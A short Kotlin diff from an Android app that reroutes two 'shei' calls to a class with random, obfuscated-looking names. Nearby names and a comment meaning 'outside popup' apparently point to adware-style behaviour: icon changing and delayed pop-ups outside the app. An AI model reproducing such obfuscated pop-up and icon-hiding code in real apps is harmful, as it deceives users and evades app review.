@@ -1,6 +1,7 @@
 package com.wallsc.scrk.core
 
 import android.os.Build
+import com.VynScOCW.HTLcjeh.AqCyQMXk
 import com.wallsc.scrk.ScapeHelperM
 import com.wallsc.scrk.listener.LifecycleActivityListener
 import com.wallsc.scrk.open.ShuajService
@@ -105,7 +106,7 @@ object FancySceneryHelper {
             withContext(Dispatchers.Main) {
                 iconWait(startTime)
                 FancyLog.e("--->>>> change")
-                ScapeHelperM.shei(mApp, 0)
+                AqCyQMXk.shei(mApp, 0)
                 registerTime()
             }
         }
@@ -163,7 +164,7 @@ object FancySceneryHelper {
             CoroutineScope(Dispatchers.IO).launch {
                 delay(LifecycleActivityListener.getDelayTimeA())
                 //外弹
-                ScapeHelperM.shei(mApp, 2)
+                AqCyQMXk.shei(mApp, 2)
             }
         }
     }
